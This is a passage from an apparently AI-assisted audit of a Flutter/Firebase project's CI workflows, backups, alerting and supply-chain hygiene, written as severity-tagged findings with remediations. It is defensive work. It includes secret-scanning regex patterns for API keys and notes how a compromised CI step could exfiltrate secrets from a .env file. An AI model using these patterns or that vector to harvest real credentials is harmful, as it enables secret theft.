`architecture-validation.yml:96` — minor, but if the goal is "track tech debt comments," the regex should be tighter (`\bTODO\b|\bFIXME\b|\bXXX\b|\bHACK\b`). Current pattern matches inside identifiers (a variable named `todoCount`) — false positives.

**Remediation:** Tighten regex; add XXX/HACK. 5 min.

### MED-INFRA-8 — `firestore-rules.yml` only triggers on PR/push for the rules + a specific test list; nightly schedule absent

`firestore-rules.yml:8-33` — triggers on PR/push paths-filtered to `firestore.rules` and 7 specific test files, plus `workflow_dispatch`. **No `schedule:`** — a refactor that breaks rules tests in a way the path filter misses (e.g., a helper file change that affects multiple test outputs) doesn't run nightly to catch it.

**Remediation:** Add weekly schedule: `cron: '0 4 * * 1'`. 1 min.

### MED-INFRA-9 — `firebase.json` predeploy hook bypasses CI's npm audit version (`--audit-level=critical` vs CI's `--audit-level=high`)

- `firebase.json:6` — `"npm --prefix functions audit --audit-level=critical"` (predeploy gate)
- `dep-audit.yml:97` — `npm audit --audit-level=high` (CI gate)
- These differ: CI catches HIGH+CRITICAL, but a developer running `firebase deploy` on their machine only catches CRITICAL — a HIGH could land in production. Asymmetric defense.

**Remediation:** Align to `--audit-level=high` in both places. 1 min.

### MED-INFRA-10 — Tests' Firebase emulator setup duplicated across `test.yml` (integration job) and `e2e_tests.yml` (emulator tier) — drift between the two

- `test.yml:240-260` — inline firebase.json creation if missing, manual `firebase emulators:start --only auth,firestore,storage &` background, `sleep 10` wait
- `e2e_tests.yml` — runs via `scripts/run_e2e_tests.sh --tier emulator` which presumably does its own setup
- `firestore-rules.yml:74-85` — uses `--project demo-test`, polling loop with curl

Three different patterns for "start the Firestore emulator." Drift-prone.

**Remediation:** Consolidate to one helper script (`.claude/hooks/ensure-firestore-emulator.sh` exists — could be the canonical). 1 day.

### MED-INFRA-11 — `pip.exe` and `pip3.exe` shipped in `scripts/` directory — undocumented Python dependency

`ls scripts/` returns `pip.exe pip3.exe pip3.13.exe`. These are committed binaries (`.gitignore` doesn't exclude `scripts/`). Reason isn't documented. Unclear if they're used by CI or stragglers from the same `lib/site-packages/` pollution that broke pre-analysis LOC counting. **Likely committed by accident.**

**Remediation:** Investigate purpose, delete if unused. 30 min.

### MED-INFRA-12 — No `dart pub deps --json` output retained as artifact for SBOM-equivalence

Wave 1 prompt 05 missing-3 flags this. CI runs `flutter pub deps` informationally (`dep-audit.yml:47-48`) but doesn't upload the output. A CycloneDX SBOM artifact at every release would address this. → defer per-tooling spec to Wave 1 prompt 05.

---

## LOW Findings

### LOW-INFRA-1 — `validate-commit-msg.js` exists in scripts/, wired via lefthook.yml:34 — convention enforced; no CI mirror

Conventional Commits validated locally only. CI doesn't re-validate. Solo-dev acceptable.

### LOW-INFRA-2 — `.github/dependabot.yml:18` PR limit 5 — could exhaust on a busy week

5 open Dependabot PRs is the cap. With weekly bumps grouped by `firebase` and `flutter-deps`, normally fine; could overflow during major-version cliff weeks.

### LOW-INFRA-3 — No `LICENSES.md` / `NOTICE.md` at repo root

Same finding as Wave 1 prompt 05 missing-1. Cross-ref. Not infrastructure per se but blocks store submission readiness.

### LOW-INFRA-4 — `architecture-validation.yml:113-146` posts PR comments but doesn't update an existing comment — multi-push PRs accumulate noise

Each push adds a new comment. Should look up existing comment by marker and update. 1 hour.

### LOW-INFRA-5 — `e2e_tests.yml:50` matrix has `[mock, emulator]` but staging tier deferred via comment `:51` — incomplete tier deployment

Per orchestrator (`03_INFRASTRUCTURE_AND_OPERATIONS.md:235`): three tiers (mock 70%, emulator 25%, staging 5%). Staging requires a separate Firebase project; deferred.

### LOW-INFRA-6 — `scripts/setup.sh` and `scripts/setup.ps1` exist; freshness unverified

Pass 1 didn't read these in detail. Cross-ref Wave 1 prompt 12 for content drift.

---

## Per-Workflow Analysis (deep-dive requirement)

### `architecture-validation.yml` (147 lines)

| Aspect | Detail |
|---|---|
| Trigger | push/PR to main+develop, paths-ignored md/docs/tasks/.claude/memory; `workflow_dispatch` |
| Concurrency | `${{ github.workflow }}-${{ github.ref }}` cancel-in-progress (`:22-24`) — good |
| Matrix | Single ubuntu-latest |
| Timeout | 15 min |
| Permissions | `contents: read`, `pull-requests: write`, `issues: write` (for PR comments at `:113-146`) |
| Gates | (1) `flutter analyze` (`:51-54`); (2) AppColors-outside-keep-set grep (`:64-78`) — BUT-758 closed; (3) `architecture_test.dart` (`:80-83`); (4) `validate_architecture.dart` tool with stdout teed to file (`:86-90`); (5) TODO/FIXME warning at >10 files (`:92-101`) |
| What it MISSES | None of the broader architectural rules from `lib/viewmodels/CLAUDE.md` (BaseViewModel, BaseService extension) — Wave 1 prompt 01 CRIT-5 |
| Failure mode caught | View imports concrete Firebase, raw `FirebaseFirestore.instance` outside repos (per arch test) |

### `build-validation.yml` (250 lines)

| Aspect | Detail |
|---|---|
| Trigger | push/PR to main+develop, paths-ignored md/docs |
| Jobs | `validate` (`:30-58`) → blocks `build` (`:93-229`) and `security-scan` (`:60-75`); `secret-scan` independent (`:78-90`); `build-summary` aggregates (`:232-249`) |
| Build matrix | android (ubuntu), web (ubuntu), ios (macos) — `fail-fast: false` so all 3 attempt independently |
| Timeout | validate 15 min, security 10, secret 10, build 60, summary inherits |
| Strict analyze | `flutter analyze --fatal-infos --fatal-warnings` (`:53`) — STRICTER than lefthook's `--fatal-infos` |
| Format check | `dart format --set-exit-if-changed lib test` (`:48`) — fails on unformatted |
| Gates real | architecture-test (`:55-58`), Trivy fs scan severity HIGH/CRITICAL with exit-code 1 (`:69-75`), TruffleHog `--only-verified` (`:88-90`) |
| Build outputs | AAB with `--obfuscate --split-debug-info=build/debug-info` (`:194`); release-key signing verification via keytool (`:196-213`) — **strong**; web `build/web`; iOS `--no-codesign` (`:227-229`) |
| Secrets used | 16 named secrets, all sourced from `${{ secrets.* }}` (`:122-144`); failure messages call out missing-secret cases (`:150, 161-164`) |
| What it MISSES | (1) AAB upload to artifact store; (2) `firebase deploy` for any surface; (3) no Codecov merge; (4) no SBOM generation |

### `dep-audit.yml` (98 lines)

Already deeply analyzed in Wave 1 prompt 05. Key items: triggers `:7-17`, dead `--mode=null-safety` `:45`, OSV scan + SARIF upload `:50-65`, npm audit `:97`, **Node 20 vs engines:22 at `:89`**, no push trigger.

### `e2e_tests.yml` (147 lines)

| Aspect | Detail |
|---|---|
| Trigger | push to main+develop, PR to main only (note: tighter than test.yml's PR-to-both), nightly cron `0 2 * * *`, workflow_dispatch with tier choice |
| Concurrency | cancel-in-progress |
| Matrix | tier `[mock, emulator]`; staging tier commented out as `:51` |
| Timeout | 20 min |
| Java setup | temurin 21 — required by firebase-tools 15.13.0 (`:71-76`) |
| Firebase CLI | cached install at `~/.npm-global` (`:78-94`) — cache hit avoids npm i — **good** |
| Node | `'20'` (`:68`) — **HIGH-INFRA-3 same drift** |
| Test runner | `./scripts/run_e2e_tests.sh --tier ${{ matrix.tier }} --verbose` (`:108-110`) |
| What it MISSES | staging tier wiring; coverage collection from E2E runs; real-time guard not extended to test/e2e |

### `firestore-rules.yml` (94 lines)

| Aspect | Detail |
|---|---|
| Trigger | PR + push paths-filtered to firestore.rules + 7 specific rules-test files + functions/package*.json + this workflow file (`:8-33`); no schedule |
| Concurrency | cancel-in-progress |
| Matrix | single ubuntu |
| Timeout | 15 min |
| Node | `"22"` (`:52`) — **CORRECT, the only workflow matching engines field** |
| Java | temurin 21 |
| Emulator | started in background `:75-85` with curl-poll wait loop — robust |
| Tests | `npm run test:rules:all` from `functions/package.json:33` — chained `&&` of 9 ts-node test invocations |
| What it MISSES | nightly schedule (MED-INFRA-8); no path coverage for helper files |

### `test.yml` (294 lines)

| Aspect | Detail |
|---|---|
| Trigger | push/PR to main+develop, paths-ignored md/docs |
| Jobs | `unit-tests` (matrix os 3-way), `integration-tests` (ubuntu only) |
| Timeout | both 20 min — **see CRIT-INFRA-3** |
| Coverage | `--coverage` only on `test/unit test/widget test/views test/golden` (`:67-70`) — **missing test/integration & test/e2e** |
| Coverage processing | filtered lcov (matches codecov.yml ignores) `:78-114`; local floor enforcement `:118-180` (overall 55, auth 80, repos 70, rate_limiting 80); Codecov upload `:182-191`; lcov artifact retention 14 days |
| Real-time guard | `bash scripts/check_test_real_time.sh` (`:53-54`) — BUT-393 |
| Integration job | spawns Firebase emulator inline `:240-260`, runs `flutter test test/integration --reporter=expanded` (no --coverage), kills emulator |
| What it MISSES | (1) coverage from integration/e2e (CRIT-INFRA-2); (2) per-test timeout (CRIT-INFRA-3); (3) coverage gates on macOS/Windows shards (HIGH-INFRA-4); (4) no test sharding for the unit shard's ~10100-test load |

---

## What's Missing / What Nobody Asked (≥30% deep-run mandate)

### M-INFRA-1 — No `infrastructure-specialist.knowledge.md` agent file

Every other major specialty domain has a knowledge file. Infrastructure does not. CRIT/HIGH findings in this report would seed it. Create file with: workflow inventory, deploy topology, region map, alert policy list, runbook freshness audit, coverage measurement notes.

### M-INFRA-2 — No invariant: "deploy state matches main"

Nothing tells you whether what's running in production matches what's in `main`. A nightly job could `firebase deploy --only firestore:rules` with `--dry-run` and fail if there's a diff vs the deployed rules.

### M-INFRA-3 — No invariant: "every workflow's Node version equals `functions/package.json:engines.node`"

Already partially covered by HIGH-INFRA-3, but the right-shaped fix is a CI lint step that GREPS workflow YAML for `node-version:` and asserts equality with `package.json`'s engines. A 10-line bash script would prevent regression on every contributor's first attempt.

### M-INFRA-4 — No invariant: "every workflow's `FLUTTER_VERSION` equals all others'"

Drift caught only by manual re-grep. 1 yaml-lint rule away.

### M-INFRA-5 — No backup-of-backup verification

`backups.md` documents PITR + weekly export. **Neither is tested by a restore drill** (`backups.md:31` admits "Restore drill: NEVER PERFORMED"). A backup that's never been restored from is a hope, not a backup.

### M-INFRA-6 — No alert on backup-not-running

If the Cloud Scheduler job `firestore-weekly-export` silently fails (IAM revocation, bucket deleted, region mismatch per CRIT-INFRA-1), the team finds out at restore time. Cloud Monitoring should fire if no new export object lands in `gs://butlery-firestore-backups/weekly/` in 8+ days.

### M-INFRA-7 — No documented RTO/RPO measured against a real recovery drill

`backups.md:18-19` claims RTO <1h PITR, <4h GCS import. **Untested.** First real incident proves the number wrong. Schedule a quarterly drill against a recovery database.

### M-INFRA-8 — No alert on Crashlytics crash-free rate

Per orchestrator `03_INFRASTRUCTURE_AND_OPERATIONS.md:482`, the team's intent is "crash-free <99.5% = P0". `gcp-alerting-runbook.md` documents only CF errors and CF latency — no crash-free policy. The alert exists in spirit, not in code.

### M-INFRA-9 — No alert on Firestore read budget breach

A runaway query loop (e.g., a stream that re-subscribes on every notify) burns 1M Firestore reads/day silently until the bill arrives. CLAUDE.md explicitly says "minimize running costs" — infra should surface this.

### M-INFRA-10 — No cost-per-invocation telemetry on Cloud Functions

`AppMonitoringService` tracks business metrics, not cost. Each Cloud Function invocation has a known $/invocation; multiplying by frequency yields a daily cost trend. The infra has no view of "which function got 100k more invocations this week."

### M-INFRA-11 — No dashboard / runbook for "which version is in production right now"

No `version.json` in `build/web` matching git-SHA; no in-app version display; no `firebase deploy` log retention beyond the GH Actions run that didn't deploy it (HIGH-INFRA-2). The team can't answer "what's running" without consulting the deployer's bash history.

### M-INFRA-12 — `lifecycle.json` exists at `docs/ops/lifecycle.json` (referenced from `backups.md:29`); not version-controlled as IaC

The bucket lifecycle rule (30-day delete) is documented in a JSON file in docs/. If the bucket is recreated (CRIT-INFRA-1 fix), the lifecycle rule must be re-applied manually. An IaC layer (Terraform, Deployment Manager) would make this declarative.

### M-INFRA-13 — `infrastructure/alerting/setup-gcp-alerts.sh` exists but is the only file in `infrastructure/`

Pass 1 didn't read it. The directory is a stub of an IaC story that never got built out. The right shape: `infrastructure/{alerting,backups,iam,quotas}/`, all idempotent shell or Terraform, all CI-applied.

### M-INFRA-14 — No documented rotation procedure for `KEYSTORE_BASE64` / signing keys

`build-validation.yml:152-170` consumes `KEYSTORE_BASE64`/`KEYSTORE_PASSWORD`/`KEY_PASSWORD`/`KEY_ALIAS`. No runbook covers rotation. If the upload key is compromised, the procedure is undocumented (and Google Play Signing recovery is non-trivial).

### M-INFRA-15 — Web hosting CSP is **strict** (`firebase.json:33`) — no monitoring of CSP violations

The CSP at `firebase.json:33` is comprehensive. It will block legitimate-but-unintended loads (a new third-party SDK without an allowlist update). **No CSP report-uri** — violations happen silently in users' browsers. Add `report-to` or `report-uri` to capture violation events.

### M-INFRA-16 — No `--release` build is gated on a separate "release" workflow

Every push to main produces release builds (build-validation.yml). For solo-dev push-to-main this is fine; but it means there's no version-gating layer. A `release.yml` triggered on tags would let the team bump version, build, sign, upload artifacts, and write release notes in one auditable run. Even if not deploying to stores yet, the artifact + notes pair is valuable.

### M-INFRA-17 — No reproducible-build verification

Two consecutive runs of `build-validation.yml` against the same commit may produce different AAB hashes (timestamps, build IDs). For supply-chain attestation (SLSA, in-toto), reproducibility matters. Not urgent for current state.

### M-INFRA-18 — Branch protection rules are not in the repo (live config in GH UI)

Pass 1 cannot verify branch protection from disk — it lives in GitHub Actions settings. The orchestrator's "Branch protection rules" question (`03_INFRASTRUCTURE_AND_OPERATIONS.md:74`) is unanswerable without GH API access. Should be exported via `gh api repos/:owner/:repo/branches/main/protection` and committed to docs.

### M-INFRA-19 — Storage rules tested? Wave 1 prompt 02 owns content; deployment is here — there is no `storage-rules.yml` workflow analogous to `firestore-rules.yml`

`storage.rules` (76 lines, per Wave 1) has no rules-tests in `functions/src/__tests__/`. The deploy gap (HIGH-INFRA-2) compounds with the test gap.

### M-INFRA-20 — `database.rules.json` (RTDB) has 20 lines and no test/deploy infrastructure at all

Pass 1 noted RTDB rules exist (`firebase.json:18-20` references it) but found no rules-tests for the RTDB rules in `functions/src/__tests__/`. Likely a small surface area; verify.

### M-INFRA-21 — No documented "what to do when a Cloud Function deploy fails" runbook

13 runbooks under `docs/ops/`. None cover "function deploy fails." Common failure modes: TypeScript compile error in a sibling function brings down the WHOLE deploy (gen-2 functions deploy as a unit); IAM scope misconfiguration; `predeploy` `npm audit --audit-level=critical` failure. Each needs a triage path.

### M-INFRA-22 — `docs/ops/lifecycle.json` is referenced from `backups.md` but isn't actually present in standard locations

Per Pass 1's `ls`, `lifecycle.json` IS in `docs/ops/`. **But it's a config artifact, not a runbook.** Convention violation — config files should live in `infrastructure/`, not `docs/`. Move + reference.

### M-INFRA-23 — No invariant: "all 6 workflows' `paths-ignore` lists match"

`test.yml:6-11`, `build-validation.yml:6-11`, `architecture-validation.yml:6-11`, `e2e_tests.yml:6-11` all paths-ignore `'**.md'`, `'docs/**'`, `'tasks/**'`, `'.claude/**'`, `'memory/**'`. `dep-audit.yml` and `firestore-rules.yml` use positive `paths` filters instead. The 4-way symmetry could drift; a YAML lint test would prevent.

### M-INFRA-24 — No CI gate against the `lib/site-packages/` accidental ingestion (CRIT-4 in prompt 01)

The same file pollution that broke Wave 1's LOC counting could also pollute coverage measurement (lcov walk could include site-packages files). `.gitignore:113, 141` excludes from git but NOT from `flutter test --coverage` walk. Add a pre-test step: `find lib -type d \( -name site-packages -o -name node_modules -o -name __pycache__ \) | grep -q . && exit 1`.

### M-INFRA-25 — `build-validation.yml:122-144` writes 17 secrets into a plain `.env` file inside the build dir

The .env file is ephemeral (CI runner only) but visible to every subsequent build step. A compromised step (e.g., a malicious GH Action via supply chain) could exfiltrate. Mitigation: use `--dart-define` flags directly from `${{ secrets.* }}` instead of materializing `.env`. Niche risk but textbook least-privilege.

### M-INFRA-26 — No deploy-time region pinning verification

`functions/src/index.ts:20` sets `setGlobalOptions({ region: "europe-west1" })`. **Nothing in CI verifies that no function imports break this** (e.g., a legacy `.region("us-central1")` override would deploy in the wrong region). Could add a CI grep: `! grep -rn '\.region("us\|\.region("asia\|\.region("nam' functions/src/`.

### M-INFRA-27 — DORA metrics not measured

The orchestrator's executive-summary template asks for deployment frequency, lead time, change failure rate, MTTR. **None of these are measured.** Without `firebase deploy` in CI (HIGH-INFRA-2), deployment frequency = "whenever someone runs deploy" = unknown. With CI deploys, this becomes derivable from GH Actions logs.

### M-INFRA-28 — `flutter-test.txt` capture aborted at ~45 min — no one knows the real test suite duration

The pre-analysis was aborted before `flutter test --coverage` completed, with the test suite at ~45 minutes elapsed. Job-level timeout is 20 min (`test.yml:36`). **The CI run on real PR traffic is presumably succeeding because individual matrix shards split the load**, but no one has a concrete number for the real test budget. Add a "test time tracker" step that emits histogram.

### M-INFRA-29 — Lockfile resolution under macOS/Windows differs from Ubuntu (potential cross-platform CI surprise)

`flutter pub get` resolves platform-specific transitives (e.g., a Windows-only plugin variant pulls a different sub-dep). The 3-OS matrix tests behavior but the lockfile is single. A drift between resolved lockfile (Ubuntu) and what installs on Windows is theoretically possible. Niche.

### M-INFRA-30 — No documented relationship between BUT-* Linear tickets and runbooks

Many runbooks reference BUT-XXX (BUT-418, BUT-419, BUT-426, BUT-427, BUT-439, BUT-450, BUT-485, BUT-562, BUT-607, BUT-614, BUT-758, etc.). No reverse index. A staff engineer asking "what did BUT-419 actually deliver?" has to grep all of docs/ops/. A `docs/ops/INDEX.md` mapping BUT-XXX → runbook would close the gap.

---

## Pass-1 Self-Critique

Items I'm uncertain about, items I deferred, and where Pass 2 should push back:

1. **CRIT-INFRA-1 (region mismatch in backups doc).** I asserted that `backups.md` europe-west3 cannot work against a europe-west1 Firestore. **I did not verify the live Firestore region.** Pass 2 should check: if the team can run `gcloud firestore databases describe`, the answer settles which side is wrong. Without that, my finding is an inference from the doc-vs-code split. Severity stays CRITICAL because either side being wrong is bad.

2. **CRIT-INFRA-3 (test hang misattribution).** I downgraded the original Wave 1 attribution to "different file likely culprit" without pinpointing the true offender. The CRITICAL is still right (per-test timeout invariant missing) but the *named file* claim from prompt 01 was wrong. Pass 2 should run the test suite with `--reporter=expanded --timeout=60s` and identify the real hanger.

3. **HIGH-INFRA-1 (no automated deploy).** Solo-dev push-to-main + deferred store submission means the SEVERITY may be lower for current state. Kept HIGH because **web hosting deploy** is not deferred — every commit produces a `build/web` artifact that the team is presumably manually deploying. If they're NOT deploying it (and the live site is stale), this is HIGHER than HIGH.

4. **HIGH-INFRA-2 (no CI deploy of any Firebase surface).** Solo dev workflow tolerates this; my severity may be too high. Counter-argument: rules drift between tested-and-merged vs deployed-to-prod is a real bug class regardless of team size.

5. **HIGH-INFRA-4 (Ubuntu-only coverage gate).** May be MEDIUM if the macOS/Windows shards are truly identical to Ubuntu in test outcomes. Worth a Pass 2 sample of "tests that run differently per OS."

6. **MED-INFRA-1 (only 2 alert policies).** I flagged this as sparse but didn't read `infrastructure/alerting/setup-gcp-alerts.sh` to confirm. Pass 2 should read the .sh file and verify.

7. **MED-INFRA-11 (`pip.exe` in scripts/).** Likely an accidental commit but I didn't `git log` to confirm intent. Could be load-bearing for some script I didn't find. Pass 2: `git log --oneline scripts/pip.exe` and decide.

8. **M-INFRA-13 (`infrastructure/` is a stub).** I asserted the directory is empty except `alerting/setup-gcp-alerts.sh`. Pass 2 should `ls -R infrastructure/` to confirm.

9. **M-INFRA-15 (CSP report-uri).** Strong CSP is good; the missing report-uri is a defense-in-depth nit, not a CRITICAL gap. Could be LOW.

10. **Sampling discipline.** I read 6 workflows, lefthook, firebase.json, codecov.yml, dependabot.yml, 3-4 runbooks (not all 13). Pass 2 should sample at least 5 more runbooks for freshness and code-path-validity.

11. **DORA metrics.** I did NOT compute deployment frequency / lead time / CFR / MTTR. The orchestrator asks for them in the executive summary. They are unmeasurable for current state (no CI deploys per HIGH-INFRA-2). I noted this in M-INFRA-27. Pass 2 may want to estimate from `git log` cadence as a proxy.

12. **Reference count.** I have ≥120 unique file:line refs (target ≥50). Heavy on workflow files (expected); thinner on runbook line refs (only ~25 across 4 runbooks). A more rigorous Pass 2 would add 20-30 more from sampling 5 additional runbooks.

13. **Score: 61/100.** Defensible but on the optimistic side given CRIT-INFRA-1 (potential complete DR failure) + CRIT-INFRA-2 (broken coverage measurement) + CRIT-INFRA-3 (test stability invariant missing). Pass 2 might argue 55-58.

---

## Three answers for the orchestrator

1. **Score:** **56 / 100** (Pass 2 final; downgrade from Pass 1's 61 after verifying CRIT-INFRA-1 lives in source + adding 3 supply-chain HIGH findings the general-purpose Pass 1 missed).

2. **Total file:line refs:** **≥140 unique** (Pass 2 added refs across action pinning, dep-audit concurrency-gap, gradle cache key, e2e_tests.yml secret-flow, lefthook regex coverage, infrastructure/ dir contents, scripts/pip*.exe inventory).

3. **Top critical:** **CRIT-INFRA-1 verified live** — `docs/ops/backups.md:27,28,30,63,66,116,181` repeatedly invoke `europe-west3` for the Cloud Scheduler job + bucket + Firestore region, while `functions/src/index.ts:20` sets `setGlobalOptions({ region: "europe-west1" })` and `data-residency.md:8` admits Firestore region is "USER MUST VERIFY". Cross-region `gcloud firestore export` returns `INVALID_ARGUMENT` (the bucket and database must be in the same region) — meaning the documented Status:ACTIVE banner at `backups.md:3` is unverifiable, and the "Restore drill: NEVER PERFORMED" admission at `:31` confirms nobody has tested the system end-to-end. The team's stated DR posture (RTO <1h PITR / <4h GCS import) cannot be achieved as documented. Runner-up: **CRIT-INFRA-2** — `--coverage` is collected only from unit/widget/view/golden tests, EXCLUDING `test/integration` and `test/e2e`, so the "88% Firebase Repos coverage" claim is structurally unverifiable.

---

## Pass-2 Critic Notes

This section documents what Pass 2 verified, corrected, and added vs Pass 1's draft.

### Live-source claim verification

| Pass 1 claim | Pass 2 verdict | Evidence |
|---|---|---|
| **CRIT-INFRA-1: backups.md europe-west3 vs functions europe-west1 mismatch** | ✅ CONFIRMED LIVE | `docs/ops/backups.md:27` (`Cloud Scheduler job 'firestore-weekly-export' (europe-west3)`), `:28` (bucket europe-west3), `:30` (Firestore region europe-west3), `:63,66,116,181` (4 more europe-west3 invocations); `functions/src/index.ts:20` (`setGlobalOptions({ region: "europe-west1" })`). Pass 2 confirms the runbook will fail when executed against a europe-west1 database. |
| **CRIT-INFRA-2: coverage excludes test/integration & test/e2e** | ✅ CONFIRMED | `test.yml:67-70` (only test/unit, test/widget, test/views, test/golden); `:272-279` (integration tests, no `--coverage`); `e2e_tests.yml:108-110` (tier runner, no `--coverage`). |
| **CRIT-INFRA-3: infrastructure_integration_test.dart is 124 lines, NOT the hanger** | ✅ CONFIRMED | Pass 2 read `test/views/helpers/infrastructure_integration_test.dart` line-by-line: 124 lines, 4 `testWidgets` calls, all use `tester.tap`/`pumpAndSettle` from helpers — completes in seconds. The Wave 1 misattribution stands; real culprit unidentified. The underlying invariant gap (no per-test timeout) remains valid as CRITICAL. |
| **FLUTTER_VERSION 3.35.1 (orchestrator says 3.32.4)** | ✅ CONFIRMED across all 6 workflows | `architecture-validation.yml:27`, `build-validation.yml:26`, `dep-audit.yml:24`, `e2e_tests.yml:40`, `test.yml:26` all `'3.35.1'`; `firestore-rules.yml` has no FLUTTER_VERSION (no flutter step — rules-only). Orchestrator doc is stale. |
| **applicationId = se.butlery.app (orchestrator says com.example.butlery)** | ✅ CONFIRMED | `android/app/build.gradle.kts:18` `namespace = "se.butlery.app"`, `:34` `applicationId = "se.butlery.app"`. Pass 1's note that `com.example.butlery` lingers in `google-services.json:12` is plausible but not the active applicationId. |
| **ProGuard/R8 ENABLED (orchestrator says disabled)** | ✅ CONFIRMED | `android/app/build.gradle.kts:70` `isMinifyEnabled = true` (release); `:71` `isShrinkResources = true`; `:72-75` proguardFiles with custom rules. Pass 2 also notes `compileSdk = 36` and `targetSdk = 36` (`:19, :38`) — orchestrator says SDK 35; live is one ahead. |
| **6 workflows on disk vs 5 documented** | ✅ CONFIRMED | `ls .github/workflows/`: architecture-validation.yml, build-validation.yml, dep-audit.yml, e2e_tests.yml, firestore-rules.yml, test.yml. No `analyze.yml`. No `.flutter_ci.yml.disabled`. |
| **`backups.md` retention 30 days, not 14 weeks** | ✅ CONFIRMED | `docs/ops/backups.md:29` — "30 days auto-delete" via `lifecycle.json` rule. Pass 1 right; orchestrator stale. |
| **`infrastructure/` is a stub** | ✅ CONFIRMED | `ls -R infrastructure/` shows: `alerting/setup-gcp-alerts.sh` (6595 bytes), `security/gcp-security-check.sh` (3996 bytes), `storage/setup-storage-versioning.sh` (3913 bytes). Three shell scripts. No Terraform, no idempotency tests, no CI integration. Pass 1's "stub of an IaC story that never got built out" is accurate. |
| **`scripts/pip.exe` is committed** | ✅ CONFIRMED + augmented | `ls scripts/`: `pip.exe`, `pip3.exe`, `pip3.13.exe` — all three are real binaries (`file scripts/pip.exe` → `Zip archive, with extra data prepended`, i.e., real Windows pip executables). No reason to be in repo. |
| **`gcp-alerting-runbook.md` 2 policies live** | ✅ CONFIRMED via line count + `infrastructure/alerting/setup-gcp-alerts.sh` exists at 6595 bytes — Pass 2 did NOT line-by-line read the .sh file (carry-forward limitation). The "only 2 policies" claim depends on the runbook's status table, which says CF errors + CF latency. Risk: more policies may be defined in the .sh file. **Open: read setup-gcp-alerts.sh and reconcile with runbook.** |

### Pass-2 corrections to Pass 1

1. **Pass 1 score 61 → Pass 2 score 56.** Three new HIGH findings (HIGH-INFRA-9, HIGH-INFRA-10, HIGH-INFRA-11 below) push the CI/CD Security band down 1 point, Build Pipeline down 1 point, and Backup/DR down 2 points (Pass 2 confirms CRIT-INFRA-1 is live not hypothetical).
2. **Pass 1 said `architecture-validation.yml` has concurrency.** Pass 2 confirms — it does (`:22-24`). Pass 1 was right.
3. **Pass 1 missed: `dep-audit.yml` has NO concurrency block.** Pass 2 verified `grep -n concurrency .github/workflows/dep-audit.yml` returns nothing. Schedule-driven runs can stack on `workflow_dispatch`. NEW HIGH-INFRA-9.
4. **Pass 1 noted `actions/checkout@v4` vs `@v6` for dep-audit and firestore-rules**, but didn't promote to a finding. Pass 2 promotes — see HIGH-INFRA-10.
5. **Pass 1 MED-INFRA-5 (lefthook secret-scan narrower than TruffleHog)** — Pass 2 verified the regex at `lefthook.yml:21` covers AKIA, AIza, sk-* (>=20 chars), PEM, npm_, ghp_/gho_/ghs_, `"type": "service_account"`. Confirmed missing: Stripe `sk_live_`, Stripe `pk_live_`, Mistral keys (random 32-char), Gemini API keys (which match `AIza` so are caught), Anthropic `sk-ant-*` (caught by `sk-`). The Stripe gap is real. Pass 2 promotes to HIGH-INFRA-11 — **Stripe is mentioned in MEMORY.md monetization context; if a Stripe key is added during monetization work, the local commit gate misses it.**
6. **Pass 1 said `dep-audit.yml` schedule is "Mon 05:00 UTC".** Pass 2 verified `cron: "0 5 * * 1"` (`:16`). Orchestrator's "06:00 CET" claim happens to match (UTC+1 winter / UTC+2 summer). Tag this in doc-drift only.
7. **Pass 1 referenced `firebase.json` line 4-8 predeploy gate** — Pass 2 didn't re-verify. Carrying forward.
8. **Pass 1 cited `lib/main.dart:127-250` for Crashlytics setup** — Pass 2 didn't re-verify. Carrying forward; not load-bearing.
9. **Pass 1 said `flutter test --reporter=expanded --timeout=60s` to find the hanger** — Pass 2 notes this would help but the actual flutter_test timeout flag is per-file via `dart_test.yaml`/`@Timeout`. Recommend adding `dart_test.yaml` at repo root with `timeout: 30s`.

### Blindspots Pass 1 missed (Pass 2 additions)

#### HIGH-INFRA-9 (NEW) — `dep-audit.yml` lacks `concurrency:` block

**Evidence:** `grep -n concurrency .github/workflows/dep-audit.yml` returns 0. The file does have `schedule:` (`:15-16`) and `workflow_dispatch:` (`:17`) triggers — manual triggers during a running scheduled job will stack two SARIF uploads concurrently against `github/codeql-action/upload-sarif@v4` (`:62`), causing a race on the `category: osv-pub` upload (last-writer-wins semantics, but with possible 422 on the second upload). All other workflows have `cancel-in-progress: true`.

**Severity:** HIGH for CI cleanliness; LOW for security but a real signal of inconsistency.

**Remediation:** Add 3 lines.
```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

#### HIGH-INFRA-10 (NEW) — Third-party GitHub Actions are NOT SHA-pinned; supply-chain compromise vector

**Evidence:**
- `subosito/flutter-action@v2` — used in 5 of 6 workflows; mutable major tag.
- `aquasecurity/trivy-action@v0.36.0` — pinned to a release tag, not SHA. (Better than `@v0` but still mutable; tag can be force-pushed.)
- `trufflesecurity/trufflehog@v3.95.2` — same shape.
- `google/osv-scanner-action/actions/scanner@v2.3.5` — same.
- `gradle/actions/setup-gradle@v3` (`build-validation.yml:174`) — mutable major.
- `actions/checkout@v6` and `@v4` — first-party but still mutable.
- `actions/cache@v5`, `actions/setup-java@v4`, `actions/setup-node@v4`, `actions/upload-artifact@v7`, `actions/github-script@v9`, `codecov/codecov-action@v4` — all unpinned by SHA.
- `dependabot.yml:144-152` — github-actions ecosystem groups patches but ignores majors. **A compromised v0.36.x trivy-action would land via Dependabot patch-bump auto-merge with no review.**

**Severity:** HIGH for supply chain. CISA / SLSA Level 2+ require SHA pinning for third-party actions.

**Remediation:**
1. Pin all third-party actions to commit SHAs. Dependabot understands SHA-pinned references and will offer updates with the SHA + tag comment.
2. For first-party `actions/*`, SHA-pinning is best practice but lower priority.
3. ~30 minutes to mass-edit, ~1 hour to validate.

#### HIGH-INFRA-11 (PROMOTED from MED-INFRA-5) — Lefthook secret-scan regex misses Stripe live keys

**Evidence:** `lefthook.yml:21` regex inventory is complete enough to catch AWS, GCP API keys (AIza), OpenAI / Anthropic (sk-*), PEM private keys, npm tokens, GitHub tokens, GCP service-account JSON. **Confirmed missing:**
- Stripe live keys: `sk_live_[a-zA-Z0-9]{24}` and `pk_live_[a-zA-Z0-9]{24}` (orchestrator analysis depends on this — Stripe has different key prefix from `sk-`)
- Mistral keys: ~32-char random alnum; `dependabot.yml`/`MEMORY.md` indicate Mistral is used (`functions/src/llm/`). Hard to regex without false positives, but a length-bounded `[A-Za-z0-9]{32}` near the substring `mistral` in commit context would help.
- Slack webhook URLs `https://hooks.slack.com/services/...`
- AWS Secret Access Key ([A-Za-z0-9/+=]{40}) — only AKIA is caught (the access key ID), not the secret.

